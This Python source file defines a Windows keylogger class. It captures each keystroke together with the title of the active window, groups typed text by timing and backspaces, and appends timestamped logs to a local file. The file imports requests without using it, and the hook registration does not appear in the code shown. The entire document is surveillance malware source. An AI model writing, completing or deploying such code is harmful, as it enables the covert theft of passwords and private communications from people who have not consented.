import requests
import time
import datetime
from win32gui import GetWindowText, GetForegroundWindow


class KeyLogger:
    def __init__(self):
        self.stack = []
        self.stack_type = self.line = ''
        self.time = self.get_time()

    def handle(self, event):
        stack_type = GetWindowText(GetForegroundWindow())
        char = chr(event.Ascii)

        if not self.stack_type:
            self.stack_type = stack_type

        delta = abs(self.time - self.get_time())

        if self.stack_type != stack_type or delta > 10:
            self.send_stack()
            self.stack_type = stack_type

        if delta < 2:
            self.save_to_line(char)
        else:
            self.save(char)

        self.time = self.get_time()

        return True

    def save_to_line(self, char):
        if char == '\x08':
            self.line = self.line[:-1]
        else:
            self.line += char

    def save(self, char=''):
        if self.line:
            self.stack.append(self.line)
            self.line = ''

        if char:
            self.save_to_line(char)

    def send_stack(self):
        if self.line:
            self.save()

        file = open('log.txt', 'a')
        file.write(f'{self.stack_type} ({self.get_date_time()}): {self.format_stack()}')
        file.close()

        self.stack = []

    def format_stack(self):
        return '\n' + '\n'.join(self.stack) + '\n' * 2

    @staticmethod
    def get_time():
        return time.time()

    @staticmethod
    def get_date_time():
        return datetime.datetime.today().strftime("%H:%M:%S - %d/%m/%Y")
